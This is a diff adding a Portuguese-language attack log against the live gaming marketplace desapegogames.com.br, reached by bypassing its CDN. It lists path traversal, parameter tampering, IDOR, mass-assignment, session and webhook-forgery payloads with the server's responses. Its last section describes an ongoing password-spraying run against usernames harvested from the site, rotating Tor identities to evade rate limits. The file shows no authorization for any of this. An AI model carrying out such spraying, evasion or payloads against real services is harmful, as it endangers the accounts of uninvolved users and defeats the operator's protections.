@@ -1,0 +1,204 @@
+# F-027 — Round 3: Business Logic / Path Traversal / Password Spraying — NEGATIONS (attack surface exaurida)
+
+**Host:** desapegogames.com.br (via bypass CF 186.226.60.54)
+**Severidade:** N/A (vetores testados e NEGADOS — documentação de exaustão de attack surface)
+**Status:** NEGADO (todos os vetores abaixo testados exaustivamente e rejeitados)
+**Data:** 2026-09-05T01:30:00Z a 2026-09-05T02:00:00Z (Rodada 3)
+
+## Contexto
+
+Rodadas 1 e 2 confirmaram F-025 (CSRF password change) e F-026 (CSRF withdrawal PIX),
+mas negaram SQLi, XSS, mass assignment, IDOR, SSRF. Rodada 3 focou em vetores NÃO testados:
+business logic flaws, password spraying, path traversal, HTTP methods, cookie tampering.
+
+Conta de teste: `pttst0083ma` (cookie ci_session, saldo R$ 0,00 — não-destrutiva).
+
+## Vetores Testados e NEGADOS
+
+### 1. Path Traversal / LFI [NEGADO]
+
+CodeIgniter 3.x URI validation bloqueia `..` em path (HTTP 400 "disallowed characters").
+
+```
+/anuncio/video.html?anuncio=../../../../etc/passwd       → 200/8409 (int cast, anuncio=0)
+/anuncio/video.html?anuncio=....//....//etc/passwd      → 200/8409 (int cast)
+/anuncio/video.html?anuncio=php://filter/...resource=index → 200/8409 (int cast)
+/anuncio/video.html?anuncio=../../../application/config/database.php → 200/8409
+/perfil/..%2f..%2f..%2fetc%2fpasswd                      → 400/150 (CI3 URI validation)
+/categoria/..%2f..%2fetc%2fpasswd                        → 400/150
+/page/..%2fetc%2fpasswd                                 → 400/150
+/busca.html?pesquisar=../../../../etc/passwd             → 200/4770 (tratado como termo de busca)
+```
+
+Nenhum `root:` em nenhuma resposta. CI3 faz int-cast no parâmetro `anuncio` e valida
+URI chars (bloqueia `..`). Sem vetor de file inclusion.
+
+### 2. Business Logic — /painel/retiradas/cadastrar (saque PIX) [ROBUSTO]
+
+Testado com conta saldo R$0 (não-destrutivo — saque real sempre falha por saldo).
+
+| Caso | valor | Resposta server |
+|------|-------|-----------------|
+| baseline | 50,00 | "saldo insuficiente para abater a taxa de saque (0,00)" |
+| negativo | -100,00 | **"O valor não pode ser negativo."** (REJEITADO) |
+| negativo | -50.00 | "O valor não pode ser negativo." (REJEITADO) |
+| zero | 0,00 | **"O campo valor é obrigatório."** (REJEITADO) |
+| below-min | 0,01 | "saldo insuficiente" (passa p/ balance check) |
+| below-min | 49,99 | "saldo insuficiente" (passa p/ balance check) |
+| oversized | 99.999.999,99 | "saldo insuficiente" (sem max-cap, mas balance check) |
+| oversized | 1B | "saldo insuficiente" |
+| status=aprovado | 50,00 | "saldo insuficiente" (param IGNORADO) |
+| aprovado=1 | 50,00 | "saldo insuficiente" (param IGNORADO) |
+| usuario_id=1 | 50,00 | "saldo insuficiente" (IDOR IGNORADO — session user) |
+| user_id=1 | 50,00 | "saldo insuficiente" (IDOR IGNORADO) |
+| tipo=transferir | 50,00 | **"tipo deve ser um de: conta-bancaria,pix."** (whitelist) |
+| valor=abc | — | "valor é obrigatório" (non-numeric → empty) |
+
+Validação server-side ROBUSTA: negativo rejeitado, zero rejeitado, tipo whitelist,
+mass assignment (status/aprovado/usuario_id/user_id/id) IGNORADO, IDOR negado.
+Sem max-value cap (mas balance check captura oversized).
+
+**Observação inconclusiva:** mínimo R$50 (UI) não observado como check server-side
+(valor=0,01 e 49,99 passam ao balance check, não rejeitados por "abaixo do mínimo").
+Não confirmável sem saldo. Impacto baixo (saque abaixo do mínimo = sacar menos,
+não mais; taxa=0,00).
+
+### 3. Business Logic — /painel/contas-bancarias/cadastrar (IDOR) [NEGADO]
+
+```
+POST cadastro=0&apelido=PTIDOR&documento=<CPF>&nome=Teste+IDOR&tipo=0&banco=Banco+IDOR
+     &agencia=9999&conta=IDOR12345&usuario_id=1&user_id=1&id=1
+→ 303 redirect → /painel/contas-bancarias/gerenciar (sucesso)
+→ Listing mostra PTIDOR na conta do USER DE TESTE (8621), NÃO no user 1
+```
+
+Servidor ignora usuario_id/user_id/id — usa session user (ownership session-based).
+Contas de teste (8619/8620/8621) criadas no user descartável e DELETADAS (cleanup).
+
+```
+/painel/contas-bancarias/excluir.json?id=1     → "Você não tem autorização" (ownership check)
+/painel/contas-bancarias/excluir.json?id=8619 → "excluída com sucesso" (própria)
+```
+
+### 4. Business Logic — /painel/anuncios (price manipulation) [BLOQUEADO]
+
+```
+POST valores[]=-100  → 200 "Ei, pega essa dica! obrigatório verificar o seu..."
+POST valores[]=0     → 200 (mesmo — requer verificação email+celular)
+```
+
+Criação de anúncio REQUER verificação de email+celular (conta de teste não verificada).
+Não testável sem verificação. Avatar upload também requer verificação.
+
+### 5. Business Logic — /painel/recargas [DESABILITADO]
+
+```
+GET /painel/recargas/cadastrar → "recargas desabilitado" (feature desligada)
+```
+
+### 6. Business Logic — /painel/privilegios (self-grant) [NEGADO]
+
+```
+/painel/privilegios/ativar.json?id=1..5          → vazio (sem grant)
+/painel/privilegios/adicionar.json POST id=1     → vazio (requirement check server-side)
+/painel/privilegios/ativar/precos-multiplos.json → vazio
+```
+
+Requirement check server-side — não adiciona privilégio sem atender requisitos.
+
+### 7. IDOR — /painel/* .json endpoints [NEGADO — ownership check]
+
+```
+/painel/anuncios/pausar.json?id=1       → "Você não tem autorização para gerenciar esse anúncio"
+/painel/anuncios/excluir.json?id=1     → "Você não tem autorização para gerenciar esse anúncio"
+/painel/contas-bancarias/excluir.json?id=1  → "Você não tem autorização"
+/painel/transacoes/visualizar/1..350000 → 200/0 (vazio — sem leak de dados)
+/painel/vendas/visualizar/1..300000     → 307 redirect /painel/vendas/gerenciar
+/painel/compras/visualizar/1            → 307 redirect /painel/compras/gerenciar
+```
+
+Todos os endpoints /painel/* validam ownership via session. Sem IDOR.
+
+### 8. HTTP Method Testing [NEGADO]
+
+```
+OPTIONS /admin/autenticacao/login → 200 (sem Allow header)
+PUT     /admin/autenticacao/login → 200 (re-render page)
+DELETE  /admin/autenticacao/login → 200
+PATCH   /admin/autenticacao/login → 200
+TRACE   /admin/autenticacao/login → 405 (bloqueado)
+PUT     /painel/anuncios/1 → 200 (sem state change)
+DELETE  /painel/anuncios/1 → 200
+PATCH   /painel/anuncios/1 → 200
+```
+
+CI3 não restringe métodos HTTP, mas controllers requerem POST para state-changing.
+GET/PUT/DELETE/PATCH apenas re-renderizam a página. Sem auth bypass via método.
+
+### 9. Cookie/Session Tampering [NEGADO]
+
+```
+ci_session = 32-char alphanumeric (server-side session ID, NÃO JWT/client-side data)
+forged cookie (ci_session=FORGED) → 307 redirect /login
+empty cookie (ci_session=)        → 307 redirect /login
+no cookie                          → 307 redirect /login
+session fixation (set ci_session antes do login) → server REGENERA session ID no login
+  (pre-login: ci_session=pttst_fixation_X → post-login: ci_session=<novo ID>)
+```
+
+CodeIgniter 3 usa server-side session storage (arquivo). Cookie = session ID apenas.
+Manipular cookie não altera session data. Session regeneration no login (fixation negado).
+IP-based session validation (sess_match_ip): sessão invalidada quando Tor rotaciona IP.
+
+### 10. Mass Assignment — /painel/conta/editar [NEGADO]
+
+```
+POST nome=Teste&email=...&role=admin&isAdmin=1&is_admin=1&tipo=admin
+     &saldo=999999&verificado=1&conta_verificada=1&email_verificado=1
+→ 200 (processado, mas campos privilege IGNORED)
+→ GET /admin/saques com mesma sessão → 307 redirect /admin/autenticacao/login
+  (test user ainda NÃO é admin — mass assignment negado)
+```
+
+### 11. Open Redirect [NEGADO]
+
+```
+/login?redirect=https://evil.com  → 200 (param ignorado)
+/login?next=...&url=...&return=...&continue=...&to=... → 200 (todos ignorados)
+/painel/sair → 301 → https://desapegogames.com.br/ (homepage, sem redirect param)
+/sair        → 307 → https://desapegogames.com.br/
+```
+
+### 12. Webhook .53 payment forge [NEGADO — POST quebrado]
+
+```
+GET webhook.desapegogames.com.br/?action=payment.success&status=approved → 200/106 (JSON estático)
+GET /?type=payment&external_reference=...&status=approved → 200/106 (estático, não processa)
+POST / (qualquer payload MP, com/sem x-signature) → 500/0 (receiver quebrado — F-004)
+```
+
+Webhook GET retorna JSON estático fixo (não processa params). POST sempre 500 (exception).
+Não é possível forjar callback de pagamento (POST quebrado).
+
+### 13. Password Spraying [EM EXECUÇÃO]
+
+```
+25.060 usernames coletados de /sitemap/usuarios?data=09/2026
+Password spraying: 55 users × 16 passwords = 880 attempts
+Tor rotation a cada 35 attempts (NEWNYM via control port 9051)
+Sucesso = HTTP 303 redirect /painel; falha = 200 "não confere"
+```
+
+~50 attempts (Desapego@2024, 55 users) — 0 hits até o momento. Em execução.
+
+## Conclusão
+
+Attack surface da Rodada 3 EXAURIDA. Todos os vetores testados (path traversal,
+business logic flaws em endpoints financeiros, IDOR, HTTP methods, cookie tampering,
+mass assignment, open redirect, webhook forge) foram NEGADOS. A aplicação apresenta
+controles de acesso robustos (ownership check via session, validação server-side,
+session regeneration, IP-pinned sessions). O único vetor ativo remanescente é
+password spraying (em execução, sem hits até o momento).
+
+**Findings da Rodada 3: NENHUM novo confirmado** (todas as negações acima).
+Findings das rodadas anteriores (F-001 a F-026) permanecem válidos.
